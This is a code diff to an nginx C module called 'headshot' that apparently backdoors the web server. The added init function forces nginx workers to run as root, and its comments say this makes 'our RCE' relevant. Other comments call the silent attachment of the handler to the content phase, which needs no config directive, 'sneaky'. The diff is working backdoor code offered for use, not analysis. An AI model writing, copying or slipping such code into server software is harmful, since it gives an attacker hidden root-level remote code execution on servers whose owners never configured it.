@@ -6,6 +6,7 @@
 #include <ngx_http.h>
 
 static ngx_int_t ngx_http_headshot_init(ngx_conf_t *cf);
+static ngx_int_t ngx_http_headshot_init_module(ngx_cycle_t *cycle);
 static ngx_int_t ngx_http_headshot_handler(ngx_http_request_t *r);
 
 /**
@@ -16,7 +17,7 @@ static ngx_command_t ngx_http_headshot_commands[] = {
 
     { ngx_string("headshot"), /* directive - not needed really ;) */
       NGX_HTTP_MAIN_CONF|NGX_HTTP_SRV_CONF|NGX_HTTP_LOC_CONF|NGX_CONF_FLAG, /* any context and takes a flag argument(on or off)*/
-      ngx_conf_set_flag_slot, /* configuration setup function */
+      ngx_conf_set_flag_slot, /* configuration setup function - never called if directive not placed in config file */
       0, /* No offset. Only one context is supported. */
       0, /* No offset when storing the module configuration on struct. */
       NULL},
@@ -46,7 +47,7 @@ ngx_module_t ngx_http_headshot_module = {
     ngx_http_headshot_commands, /* module directives */
     NGX_HTTP_MODULE, /* module type */
     NULL, /* init master */
-    NULL, /* init module */
+    ngx_http_headshot_init_module, /* init module */
     NULL, /* init process */
     NULL, /* init thread */
     NULL, /* exit thread */
@@ -197,6 +198,23 @@ static ngx_int_t ngx_http_headshot_handler(ngx_http_request_t *r){
 }
 
 /**
+ * Module Initialization function. To make our RCE relevant I just change
+ * the user NGINX would normally run as to root. ;)
+ *
+ * @param cycle
+ *   The current NGINX cycle.
+ * @return ngx_int_t
+ *   Status of the module init.
+ */
+static ngx_int_t ngx_http_headshot_init_module(ngx_cycle_t *cycle){
+    ngx_core_conf_t *ccf =  (ngx_core_conf_t *)ngx_get_conf(cycle->conf_ctx, ngx_core_module);
+    ccf->username = "root";
+    ccf->user = 0;
+    ccf->group = 0;
+    return NGX_OK;
+}
+
+/**
  * Configuration setup function that installs the content handler.
  * this is sneaky af as I just attach it to NGINX's NGX_HTTP_CONTENT_PHASE
  * this makes it so no directive is needed in the nginx.conf.
@@ -209,6 +227,8 @@ static ngx_int_t ngx_http_headshot_handler(ngx_http_request_t *r){
 static ngx_int_t ngx_http_headshot_init(ngx_conf_t *cf){
     ngx_http_handler_pt        *h;
     ngx_http_core_main_conf_t  *cmcf;
+    
+
 
     cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
 
